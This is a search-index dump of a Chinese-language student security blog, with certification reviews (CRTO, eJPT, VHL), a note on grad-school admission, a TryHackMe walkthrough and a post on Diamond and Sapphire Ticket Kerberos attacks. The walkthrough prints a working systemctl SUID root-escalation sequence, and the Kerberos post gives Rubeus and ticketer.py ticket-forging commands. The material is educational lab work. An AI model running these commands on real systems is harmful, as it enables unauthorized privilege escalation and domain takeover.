{"pages":[{"title":"About","text":"大家安安CyCraft Part-Time/ NTHU IIS / CRTO / eJPT","link":"/about/index.html"}],"posts":[{"title":"CRTO Certificate Review","text":"大家安, 在上個月初的時候考到了 Zero-Point Security 的 CRTO, 臺灣目前還沒有相關的心得文, 所以分享一下, 讓大家多一個可以增進自己紅隊能力的方法 Introduction這篇文章大致會介紹 CRTO 是什麼, 所需的先備知識, 課程內容, 考試, 這幾個大部分 作者是 Daniel Duggan (Rasta Mouse), HackTheBox 中的 RastaLab 就是這位作者創的 那 CRTO 和 CRTP 是不一樣的課程, 雖然兩張的受眾蠻像的, 但在內容還是有蠻多差別的, 如果想看 CRTP 的心得文做比較, 蠻推薦這篇的 這張證照以及作者大家可能比較陌生, 這邊先提幾個最大的賣點 能以極低的價格 (£399.00 ≈ NTD 15,000) 使用到 Cobalt Strike 為 Cobalt Strike 官方認證的 Partenr 課程內容包括內網滲透中各個攻擊手法 (Kerberos Delegation, Abuse Domain Outbound Trust, LAPS, etc.), 以及如何以較隱蔽的方式, 執行這些攻擊手法, 也就是 OPSEC 有一台建好的 Kibana 可以讓你觀察做完攻擊手法後會產生什麼 Event Log, 並思考如何不被偵測到 除技術性內容外, 課程內容還包括如何執行一個正確的紅隊演練 如果有購買課程, 免費享有後續更新課程, 並且最近要將課程和 Lab 中 Cobalt Strike 升級到最新的 4.7 版本 人性化的考試方式 (4 天 48 小時, 就是在 4 天內把這 48 小時用完, 怎麼用沒關係, 想 12 小時 * 4 或 24 小時 * 2 都 OK) 這堂課會有一個專屬的 CRTO Discord channel, 有買這堂課的人才能加進去, 裡面的人都十分友善, 看到有人問問題會馬上回, 作者本人看到問題或是訊息也會馬上回, 裡面除了會討論 CRTO 之外, 也會討論其他技術性相關的事情, 算是一個還蠻活躍的小社群 為何我選擇這門課因為我目前在奧義智慧科技 (CyCraft) 實習, 主要是研究 AD 相關的攻擊手法, 但大多數都是較為單點的攻擊手法研究, 對整個 AD 的攻擊鏈或是一個攻擊後續能做什麼使用沒有概念, 因此找了 CRTO 來考, 那在考之前也知道有這張證照, 本來是打算考完 OSCP 後再考這張的, 但由於近期 OSCP 考試有新增 AD, 加上工作上有需求, 再加上在履歷中能寫自己會使用 Cobalt Strike, 以一個學生來說算是還不錯的加分項目, 所以就先考 CRTO 了 那根據考過 OSCP 和 CRTO 的人說, CRTO 所涵蓋的 AD 遠超過 OSCP 所涵蓋的, 如果不像我是因為有工作上的需求, 加上手頭上的錢錢很夠的話, 推薦可以先考 OSCP 價格價格表如下 Types Price Course Only £365.00 ≈ NTD 12,500 Course + 40 hours Lab £399.00 ≈ NTD 15,000 如果想要分成 4 期付, 在購買課程的地方也有這個選項, 整體價格算是蠻親民的, 雖然這張證照是公司補助我的, 但也能明顯的看出金額比起市面上大家數的證照 (Offensive-Security, SANS, INE, etc.) 還便宜 所需的先備知識 Before undertaking the course, students should have a basic knowledge and a working understanding of Windows &amp; Active Directory; basic scripting and/or programming (PowerShell, C/C++ or C# would be a bonus); and networking. 這是直接從課程網頁節錄下來的, 簡單來說就是要對 AD 有一點點概念就 OK 了, 但有鑑於我平常實習就是在研究 AD, 所以可能不太有信服力, 加上如果目前還是學生應該沒有什麼機會可以碰到 AD, 所以這邊我有兩個推薦的資源 TCM Academy 的 Practical Ethical Hacking 我有上過, 品質很好, 而且不單單只有帶到 AD, 連基礎的工具和手法也都有帶到, 算是不錯的入門課程 TryHackMe 的 Red Teaming Learning Path 最近一個多月才出的, 就我看到別人的 review 是給予很好的評價, 並且那篇 review 也有提到這個 path 算是準備 CRTP 或 CRTO 很不錯的課程, 如果有一點滲透測試的基礎, 我推薦可以花個小錢 (大概 NTD 300) 來完成這條 path, 完成後無縫接軌 CRTP 或 CRTO 基本上應該是沒問題 課程內容課程內容大概是這樣 Course Introduction What is Red Teaming? Phases of an Engagement Command &amp; Control Cobalt Strike Primer Planning &amp; Client Engagement Phase Assessment Phase External Reconnaissance Initial Compromise Host Reconnaissance Host Persistence Host Privilege Escalation Domain Reconnaissance Lateral Movement Credentials &amp; User Impersonation Password Cracking Hints &amp; Tips Session Passing Pivoting Reverse Port Forwards Data Protection API Kerberos Group Policy Discretionary Access Control Lists MS SQL Servers Domain Dominance Forest &amp; Domain Trusts Local Administrator Password Solution Bypassing Antivirus Bypassing AppLocker Data Hunting &amp; Exfiltration Post-Engagement &amp; Reporting Extending Cobalt Strike 可以看到很多內網滲透常見或用到的攻擊手法都有包括在裡面, 那除了教攻擊手法外, Rasta Mouse 還會講他自己在做紅隊時的方法論 (methodology), 以及相關的 OPSEC, 網路上的教學文章相對來說比較少見, 如果想要了解更詳細的內容可以直接私訊我 LabLab 算是這個課程的重頭戲, Lab 裡共有 4 個 domain, 每個 domain 大概有 4 台電腦, 所以就是有大概 16 台電腦可以玩, 要透過瀏覽器進到 SnapLabs 才能存取到 Lab, 使用起來我沒有什麼太大的問題, 總共有 40 個小時可以做練習, 一開始會覺得有時限壓力很大, 但只要記得關掉, 基本上是不太會用完, 像我課程上完還有 25 小時還沒用, 所以可以放輕鬆地做練習 這 4 個 domain 都是兩兩相通的, 也就是 A 可以存取 B, B 可以存取 C, 但 A 不能存取 C, 以此類推, 那這個 Lab 的用意就是讓你練習課程中學到的各種技巧, 以及體驗實際使用 Cobalt Strike 在做紅隊演練時會是什麼感覺 Lab 中有一個 Kibana, 可以讓你觀察做完攻擊手法後會產生什麼 Log, 如果太顯眼的話, 可以想辦法隱藏自己的流量或是換成另一個能達到相同目的的攻擊手法 考試心得那在考試之前我整個課程的內容大概重做了三次, 第一二次就是照著做, 第三次就針對比較不熟的地方來做練習 在你付完錢之後就可以預約考試了, 也可以今天預約隔天就考, 沒什麼太大的限制, 預約之後也可以改時間, 時限是 4 天 48 小時, 想怎麼分配都沒關係 然後考試的方式基本上跟 Lab 差不多, 可以想像成是有另外一個時限 48 小時然後不會給你任何資訊的 Lab, 可以隨時暫停跟開始, 暫停的時候雖然不會算時間, 但 Cobalt Strike 的 beacon 會全消失 (因為暫停就像關機一樣), 所以如果想要維持打下機器的 beacon 的話, 就需要想一些 persistence 的方法 考試沒 rabbit hole, 只要你好好上課, 作筆記, 並有理解課程內容的話, 會發現攻擊的路徑很清晰, 需要做的只有 Think out of box 而已 考試注意事項那在原本的 Lab 中, defender 在幾個 domain 中是沒啟用的, 那 Rasta Mouse 為了要讓考試比較有挑戰性一點, 考試中所有的 domain 都有 enable defender, 雖然 defender 很好繞, 但還是要注意蠻多東西的 在你預約考試之後會有一份 Threat Profile 給你, 如果沒照著 Threat Profile 做的話, 會連一台機器都打不下來, 這邊推薦 malleable C2 profiles 要好好練習 結語那真的很推薦不論是學生, 做攻擊, 做防守的都可以去上跟考看看的, 因為會從裡面學到很多, 學生可以碰到平常打 TryHackMe 或 HackTheBox 很少碰到的 AD 環境, 做攻擊的可以學到 C2, 各種攻擊手法以及和手法相關的 OPSEC, 做防守的可以學到攻擊者是如何觀察到 AD 上可以被濫用的 “feature”, 並透過這個 “feature” 達到什麼目的, 以及透過 Lab 中的 Kibana 觀察, 在做 recon 或是攻擊手法會有什麼 Log 整體來說是真的很推薦, 除非已經是紅隊大佬, 啪一下就可以打下整個企業 AD, 不然或多或少都能學到東西 那 Rasta Mouse 在近期也有出 CRTO II, 比起 CRTO, 比較著重在 Bypass EDR 這個面向, 雖然我還沒實際出去工作, 但實不實會看到有文章或是 talk 在說 Red Team 是 EDR Bypass Team, 從這邊就可以看的出來在實戰上, EDR 對攻擊者來說算是一個很大的挑戰 那有些人可能會好奇 OSCP, CRTP, CRTO, OSEP 這幾張偏紅隊證照的比較, 但我目前能力還不夠, 只考過 CRTO 一張, 等未來都把這些證照補齊, 沒意外應該是會寫一篇比較的文章 Good Review https://www.youtube.com/watch?v=2IPxJSIe-lk https://www.youtube.com/watch?v=P2ioSJdcAJw https://m3rcer.github.io/redteaming/CRTO_Exam_Review/ https://jonyschats.nl/posts/CRTO-review/ https://0xash.io/Certified-Red-Team-Operator-Review/# https://http418infosec.com/certified-red-team-operator-crto-review https://amirr0r.github.io/posts/crto-review/ https://gustavshen.medium.com/my-crto-course-and-exam-review-433f967f712e https://jakemai0.github.io/posts/crto/","link":"/2022/09/25/CRTO_Certificate_Review/"},{"title":"eJPT Certificate Review","text":"大家安，大概在四月中的時候拿到eJPT，在考之前就有發現臺灣沒有任何一篇有關eJPT的心得，想說分享一下順便紀錄一下心得。 eJPT 全名是 eLearnSecurity Junior Penetration Tester，定位是入門的證照，在國外這幾年越來越多人拿來和CEH、CompTIA Security+…等類似的證照拿來做比較，不過eJPT不同的地方就在於他的考試方法是實務的方法，等等下面會介紹是何種實務，若想看我對這些證照的想法可以去看我的另一篇文 對於各種資安入門證照的看法 IntroductioneLearnSecurity對eJPT的介紹當初會看到這張證照是因為想考CEH（因為快要畢業加上不確定考不考得上研究所，所以想先拿證照至少可以拿來秀一下當工作面試加分的東西），然後去爬reddit之後發現有人問到CEH下面每個人幾乎都在推這張，還有一些youtuber也有對這張證照的review，加上價格合理（課程 + 5.5小時的影片 + 16個labs + 3個Black-box的Pentest + 可以重考一次價格500鎂），加上又是給剛入門的考，所以就打算先以這張證照當作CEH的替代品。 然後簡單講一下考試的方法，就是按下確認鍵後考方會寄一封mail給你，裡面有一份pdf，裡面是講一些規定還有推薦的工具，然後還有一段ip位址，然後就沒了，給你3天去compromise這台機器。 這種實務的考法就很像國外常常有人說的Get Your Hands Dirty一樣，因為選擇題常常會讓人還沒融會貫通前就先把答案背起來了，常常背完就忘了，然而像eJPT這種考法由於沒有任何的記憶點，只能靠自己真的理解這個工具或方法後，然後實際去操作，才能通過測驗，取得證照，這也是為何許多人越來越推行這張證照的緣故。 課程心得 &amp; 考試心得PTS (Penetration Testing Student)PTS是eLearnSecurity在你買考試的voucher時一起給的，讀熟PTS一定一定會拿到證照，因為課程就是設計來讓你可以獲得通過PTS所需的知識。然後Labs會有解答，所以也不用太害怕會做不出來，但是有看slide跟影片，應該就都可以做的出來，16個labs我大概有3個左右是看了解答才知道怎麼做的，另外還有3個Black-box的Pentest，難度跟Labs有差，做不出來也不用太灰心。官網上對PTS的介紹： For absolute beginners in IT Security Minimal pre-requisites Learn about: Routing, Forwarding, and TCP/IP; Information Gathering; Scanning; Vulnerability Assessments; Buffer Overflows; XSS; SQL Injection; System and Network Attacks; and Basics of Web App Pentesting Learn how to: Analyze Traffic with Wireshark, Exploit Vulnerable Hosts, Move Laterally, Manipulate Traffic, Crack Passwords, and Exfiltrate Data Develop Pentesting tools in C and Python Learn how to use tools like Nmap, Nessus, Hydra, Metasploit, and Burp Suite Preparation for the Penetration Testing Professional (PTP) course Obtaining the eJPT certification qualifies you for 40 CPE 考試心得用心讀大概花一個多月或20幾天就可以熟讀內容加上Labs大概做兩次，難度大概介於Labs跟Black-box的Pentest，實際上的考法和Black-box一樣，給你一段IP位址外什麼都不會給，考題有20題選擇題，只能錯5題，我自己是19/20，選擇題的題目大概會是（不能講實際的題目出來，官網有明確說不能spoiler） 在某某某文件中有什麼 某人的密碼是什麼 當然題目是英文的，我只4懶ㄉ打英文才打中文ㄉ，另外別肖想透過題目來取得一點在Pentest的想法（跟CEH Practical不一樣），真的要實際把機器compromise後才知道題目在問甚麼以及答案到底是什麼，中間的過程真的得透過自己的想法一步一步來，然後攻下機器。然後有整整3天的時間可以讓你完成考試，所以真的真的真的完全不用擔心會做不完，但是如果你想知道大概多久做完才算正常，大概10小時以內，我自己是7小時，但考慮我讀了快兩個月，7小時真的算很久了，然後去reddit爬文好像都大概5、6小時就結束了，不過也有看到做12小時的，只能說讀的越熟一定會解的更快。然後考試不會像OSCP需要架設攝影機或者限制不能使用自動化工具，考試的過程中你可以想做什麼就做甚麼，唯一不能做的事情就是去PTS的論壇上面問有關考試題目的問題。我在考試時也是非常緊張，因為想到有可能會在過程中遇到解不出來的問題，或者遇到什麼奇怪的事情，因為考前一天想說要考試了，更新一下kali，也沒snapshot，更新完之後一大堆問題，只好回到超級久以前的snapshot，不過雖然eJPT可以隨時考，考試是按下一個按鈕之後就會開始，不像OSCP要先排時間或是CEH要預約之類的，但我想說我都拖兩個月了，再不考可能就會變成拖三個月，所以還是硬著頭皮上了，但實際上也沒那麼困難，雖然中間還是有卡一下，可是想通之後就會覺得那個是超級簡單的問題。 考後心得官方認證在考取證照後所具備的知識和技能： Good knowledge of TCP/IP Good knowledge of IP routing Good knowledge of LAN protocols and devices Good knowledge of HTTP and web techologies Essential penetration testing processes and methodologies Basic Vulnerability Assessment of Networks Basic Vulnerability Assessment of Web Applications Exploitation with Metasploit Simple Web application Manual exploitation Basic Information Gathering and Reconnaissance Simple Scanning and Profiling the target 整體來說，以剛入門的人來說，這張真的算是偏簡單的證照，真的很推薦可以考看看，但如果有經驗的，除非是像我一樣快畢業而且身上沒有任何作品，CTF也打的不好，也沒打過HTB的任何一台機器，要考OSCP也考不過的人，我才會推薦考這張，不然時間金錢都足夠的狀況下，真的比較推薦OSCP，畢竟臺灣我覺得應該很少人知道這張，實際上要找工作我也不太確定助益大不大，因為我也還沒開始找工作，但如果是不太知道該怎麼入門的，有錢的話考這張就對了。 謝謝大家看完這篇心得文。這篇應該是臺灣第一篇eJPT的心得文，ㄏ。如果有任何問題歡迎私訊facebook問我哦。","link":"/2020/08/07/ejpt_review/"},{"title":"VHL Certificate Review","text":"大家安，今天來介紹一個OSCP考前不錯的練習網站。 VHL 全名 Virtual Hacking Labs，是reddit在討論考OSCP前不錯的練習網站時很多人推的練習網站，不像HTB有點CTF-ish，VHL是偏向real-world的。而Labs分成三個等級：Basic、Advanced、Advanced+，基本上只要找到正確的弱點就可以打下 Basic 的機器，Advanced 的機器需要的技巧就比較多了，像是： 從某台機器中找到另一台機器上 CMS 的密碼，接著植入 webshell 來取得機器的完整控制權 藉由弱掃工具找到弱點打進機器後透過 Privilege Escalation 取得機器的完整控制權 等等各式各樣的弱點串連，才能將大多數的Advanced機器打下。而Advanced+的機器由於因為時間因素，所以沒辦法碰到任何一台。 那當初在考這張證照的時候正在準備研究所的考試，因此只買一個月的方案，所以，我要拿到這張證照，就必須在這30天內打下20台機器，並繳交詳細的報告，並通過他們工作人員的線上審核才可以拿到，而VHL有兩張證照可以考，其中一張就是我上面所介紹的，另一張則是需要打下10台Advanced+的機器，並且其中兩台需要透過 manual exploitation ，也就是不能使用任何自動化工具或者是公開的腳本。更詳細的內容可以去參考他們的網站https://www.virtualhackinglabs.com/ 整體來說，非常滿意，因為真的能增進自己滲透測試的能力，像是要如何讀懂、瞭解原理並使用漏洞腳本，要拿到證照要打下20台漏洞都不同的機器，這個量加一加就大概40~50多個漏洞，也算挺多的，那未來準備考OSCP的時候，會再來挑戰Advanced+的機器。 謝謝大家看完這篇心得文。","link":"/2021/01/02/vhl_review/"},{"title":"110清大資安所考試正取心得","text":"大家安，今天來分享正取資安所的心得。 先附上人權圖 前言身處在彰化這個沒有任何人在做資安的資安沙漠，在這條資安路上算是還蠻孤單的，所以在進入內文前先感謝我的女友、DEVCORE 的徐念恩先生、和我一起準備研究所考試的朋友（雖然沒人跟我一樣考資安所）等許多人，沒有你們的幫助，我是不可能考上資安所的，謝謝你們！ 背景 彰師大資管系應屆畢業生 在校成績6X% 兩張證照（eJPT、VHL Cert of Completion） 教育部大多數資安計畫都有參加（e.g. MyFirstCTF、AIS3 EOF、Summer Camp、AIS3、臺灣好厲駭等） 考試準備這應該是大家最想知道的部分，由於我對於證照的鑽研比較多，當初看到考古題就知道題目都是從 CompTIA Security+ 來的（除了非選）。 因為直接考證照的價格太高，所以就決定去 Udemy 上一堂Security+的課程，而當初找到的是這堂：TOTAL: CompTIA Security+ Certification (SY0-501)，看完課程之後我就接著看這本書 SY0-501 Study Guide，看自己有沒有理解線上課程的內容，看完書後去網路上找了非常多練習題練習，我當初用的網站是 Quizlet，上面有很多 Security+ 的練習題，練習題加一加大概有快到一千多題，這一千多題我理解十分透徹，也是因為這樣，我的選擇題全對。 另外雖然我的非選沒拿到分數，但非選大多數都是密碼學還有一些攻擊手法（像 SQLi、Buffer Overflow 等），而 Security+ 密碼學方面的部分只有大概講概念，我建議是直接啃一本原文書，並且密碼學的數學原理、密碼學的演算法、Hash是什麼、Hash的演算法、Key Exchange是什麼等（不只我前面提的那些）全部都理解透徹，假如有打CTF的話又加上啃完一本密碼學原文書，我相信非選應該是十拿九穩，那假如沒時間，IT邦的鐵人賽也有很優質的密碼學文章，看完有個概念也是不錯的。 面試知道自己第一階段有過之後就趕緊準備備審，由於當初有推甄過清大資安所，所以備審有了大概的樣子，但從推甄到考完試中間其實做蠻多事情的，所以備審之後又有大改，也非常感謝幫助我改過備審的人，真的非常感謝你們！ 面試方面則是三分鐘的自我介紹和兩分鐘的教授提問，但自我介紹一定要準備三分鐘和一分鐘的，因為推甄面試的時候我就被改成一分鐘，考試面試聽未來的同學說也被改成一分鐘，所以，一定要兩個都準備。 那我考試的時候自我介紹就變成正常的三分鐘，教授只問有沒有報其他學校，回答完就出來了，整體時間感覺沒超過五分鐘，當初出來的時候還想說又要落榜了，不過結果蠻不錯的。 準備過程當初會報考資安所是因為本來就確定要走資安，加上臺灣資安的研究所其實沒幾間，有幾間的考科還跟資工一模一樣，準備起來會很費力，所以打算找一個能邊讓我準備考試又可以邊準備工作能力的研究所，所以就找到清大資安所。 而在準備考試的過程中，我也一直準備和工作相關的能力，像是去考了證照，還透過許多網站增進自己滲透測試的能力，這些對要考資工所的人來講，算是比較難做到的，因為資工所的考科實在是過於繁多，所以很難像準備資安所這樣齊頭並進。 那最後，謝謝大家看完這篇心得文，如果有任何問題歡迎私訊 Facebook 問我哦，也祝如果有未來考生看到這篇文也能高分錄取ㄛ","link":"/2021/04/10/%E6%B8%85%E5%A4%A7%E8%B3%87%E5%AE%89%E6%89%80%E8%80%83%E8%A9%A6%E6%AD%A3%E5%8F%96%E5%BF%83%E5%BE%97/"},{"title":"THM Vulnversity Walkthrough","text":"大家安，今天來分享一下在解這台簡單的機器讓我想比較久的地方。 除了最後要privilege escalation的部分之外，其他地方應該都不會有什麼大問題。privilege escalation有很多方法，但題目內就有提示這台機器要privilege escalation的關鍵點在SUID。 What is SUID？簡單來說就是當執行這檔案時，會讓使用者暫時以檔案擁有者(file owner)的權限執行，詳細說明可以去看 https://www.cnblogs.com/sparkdev/p/9651622.html ，所以所以第一個的目標就是要找到這台機器內有什麼檔案是SUID加上owner是root的，如果沒有頭緒，可以直接google find suid，就有一大堆資料可以找了，這邊我是用 find / -user root -perm -4000 2&gt;/dev/null，就會看到很多東西，裡面有一個就是第一題的答案，/bin/systemctl， Become root一開始我也是靠著TryHackMe題目上的字數提示才知道答案是systemctl的，由於我對linux commamd的熟悉度還沒很高，所以我是直接google systemctl privilege escalation，就跳出 https://gtfobins.github.io/gtfobins/systemctl/ ，關於systemctl的詳細說明可以看https://blog.gtwang.org/linux/linux-basic-systemctl-systemd-service-unit-tutorial-examples/ ，找到gtfobins基本上答案就出來了 1234567891011$ touch get_flag.service$ echo '[Service]&gt; Type=oneshot&gt; ExecStart=/bin/sh -c \"cat /root/root.txt &gt; /tmp/flag\"&gt; [Install]&gt; WantedBy=multi-user.target' &gt; get_flag.service$ /bin/systemctl enable --now get_flag.service$ cat /tmp/flag","link":"/2020/09/02/THM_Vulnversity_WriteUp/"},{"title":"Diamond Ticket &amp; Sapphire Ticket","text":"大家安安, 這篇文章簡單介紹近期比較新的 AD 攻擊手法, Diamond Ticket 和 Sapphire Ticket 在開始介紹 Diamond &amp; Sapphire Ticket 之前, 要先介紹 Silver &amp; Golden Ticket, 因為在理解 Diamond &amp; Sapphire Ticket 之前需要先理解這兩個 Ticket 的原理和限制 Silver &amp; Golden Ticket簡介 這邊不詳細描述 Silver 和 Golden Ticket 的原理 簡單來說 Silver Ticket 是偽造的 TGS, 如果拿到 machine account key, 可以偽造該 machine 上任何使用者到該 machine service 的 ticket, 後續可以做橫向移動或是提權 Golden Ticket 是偽造的 TGT, 需要 krbtgt key, 但通常拿到 krbtgt key 就已經打下整個 domain 了, 所以通常拿來進行 persistence, 或是在 Parent-child Trust 的情境下拿來進行橫向移動 限制 &amp; 可能風險 Silver Ticket 雖然使用條件較為寬鬆, 但其限制為有時只限制於任何使用者, 但單一 service 或是任何 service, 但單一 machine Golden Ticket 雖然能以任何使用者的身分訪問 domain 上任何的 service 但其限制為需要拿到 krbtgt key 因為 Silver 和 Golden Ticket 都是透過偽造 ticket 達到的, 因此在 Kerberos 驗證流程中會沒有相對應的 Service Ticket requests (KRB_TGS_REQ) 或是 TGT request (KRB_AS_REQ), 因此常被檢測到 Diamond Ticket簡介 &amp; 好處 Diamond Ticket 是近兩個月才跑出來的攻擊手法, 其結果和 Golden Ticket 相同, 如果成功使用 Diamond Ticket, 就能以任何使用者的身分訪問 domain 上任何的 service 但比起 Golden Ticket, Diamond Ticket 更為隱密, 即 OPSEC 較佳, 不容易被偵測到 OPSEC 較佳的原因是因為 Golden Ticket 是透過偽造 TGT 達成的, 因此不會有與其相對應的 TGT request (KRB_AS_REQ), 那也因為 TGT 是偽造的, 所以其中的 PAC 也是偽造的, 有時候會因為和真實的 PAC 不像, 讓被偵測的機率提高 而 Diamond Ticket 是直接請求一個 TGT, 並對 PAC 解密, 修改 PAC, 接著重新計算 singnatures, 並再次加密這個 TGT 那也因為是直接請求一個 TGT, 所以在 Kerberos 驗證流程中就會有相對應的 TGT request (KRB_AS_REQ), 從而降低被偵測到的機率 攻擊指令 那因為需要對 TGT 進行解密, 所以也需要 krbtgt key, 並且強制需求要是 AES256 key Command: 1Rubeus.exe diamond /domain:DOMAIN /user:USER /password:PASSWORD /dc:DOMAIN_CONTROLLER /enctype:AES256 /krbkey:HASH /ticketuser:USERNAME /ticketuserid:USER_ID /groups:GROUP_IDS 實際運行攻擊指令後會發現以下訊息 1234567891011121314151617181920212223[*] Action: Diamond Ticket[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/dc-2.dev.cyberbotic.io'[+] Kerberos GSS-API initialization success![+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.[*] Found the AP-REQ delegation ticket in the GSS-API output.[*] Authenticator etype: aes256_cts_hmac_sha1[*] Extracted the service ticket session key from the ticket cache: +mzV4aOvQx3/dpZGBaVEhccq1t+jhKi8oeCYXkjHXw4=[+] Successfully decrypted the authenticator[*] base64(ticket.kirbi): doIFgz [...snip...] MuSU8=[*] Decrypting TGT # here[*] Retreiving PAC # here[*] Modifying PAC # here[*] Signing PAC # here[*] Encrypting Modified TGT # here[*] base64(ticket.kirbi):doIFYj [...snip...] MuSU8= 在 doIFgz [...snip...] MuSU8= 的下一段, 明顯可以看出 Diamond Ticket 的確是透過修該合法的 TGT 當中的 PAC 來達到這個攻擊手法 後續只要再將這個 ticke pass 到環境中就可以使用了 Sapphire Ticket簡介 &amp; 好處 而 Sapphire Ticket 是在我這篇文章 PO 出來的前幾天才出現的攻擊手法, 是我在滑 Twitter 時看到這篇文章才發現有這個攻擊手法的 Sapphire Ticket 和 Diamond Ticket 的差別只在於修改 TGT 中 PAC 的方式 Diamond Ticket 是透過對 TGT 中 PAC 新增特權群組 (privileged groups), 或是直接偽造一個特權群組並寫入 TGT 的 PAC 中 那這個行為會讓檢測軟體能透過檢查 TGT 中 PAC 的群組去和 Active Directory 中這個群組實際有沒有包含這個 user 做關聯 舉例來說, 如果要讓沒有特殊權限的 userA 能夠訪問 doamin 上的各個 service, 就可以使用 Diamond Ticket, 那在過程中會修改 TGT 中的 PAC, 實際觀看這個 PAC 的值會發現, 使用者是 userA, 群組是一個特權群組, 這時候檢測軟體去 Active Directory 查看 userA 是不是這個特權群組的成員, 就會發現異常狀況 那 Sapphire Ticket 就是改良 Diamond Ticket 上面提到的可能的風險, 透過 S4U2self + u2u 來取得高權限使用者的 PAC, 並將 TGT 的 PAC 取代成高權限使用者的 PAC 這樣檢測軟體在對 PAC 做檢測會因為 PAC 中特權群組裡的確有這個高權限使用者, 所以就認定該 PAC 是合法的 因 S4U2self + u2u 其背後原理有點複雜, 故不多在這贅述, 以後如果有機會再和大家分享其背後的原理 攻擊指令 由於太新, 因此在 Windows 上還沒有相關的工具能實作此攻擊手法, 目前只有 UNIX-based 的工具 Impackt 的 ticker 能實作 Command 1ticketer.py -request -impersonate 'domainadmin' -domain 'DOMAIN.FQDN' -user 'domain_user' -password 'password' -aesKey 'krbtgt/service AES key' -domain-sid 'S-1-5-21-...' 'baduser' Reference https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/silver https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/golden https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/diamond https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/sapphire","link":"/2022/09/28/Diamond-Ticket-Sapphire-Ticket/"}],"tags":[{"name":"cert review","slug":"cert-review","link":"/tags/cert-review/"},{"name":"zeropointsecurity","slug":"zeropointsecurity","link":"/tags/zeropointsecurity/"},{"name":"pentest","slug":"pentest","link":"/tags/pentest/"},{"name":"red team","slug":"red-team","link":"/tags/red-team/"},{"name":"elearnsecurity","slug":"elearnsecurity","link":"/tags/elearnsecurity/"},{"name":"vhl","slug":"vhl","link":"/tags/vhl/"},{"name":"institute","slug":"institute","link":"/tags/institute/"},{"name":"TryHackMe","slug":"TryHackMe","link":"/tags/TryHackMe/"},{"name":"walkthrough","slug":"walkthrough","link":"/tags/walkthrough/"},{"name":"AD technique","slug":"AD-technique","link":"/tags/AD-technique/"}],"categories":[{"name":"Certificate","slug":"Certificate","link":"/categories/Certificate/"},{"name":"Institute","slug":"Institute","link":"/categories/Institute/"},{"name":"Walkthrough","slug":"Walkthrough","link":"/categories/Walkthrough/"},{"name":"Technique","slug":"Technique","link":"/categories/Technique/"}]}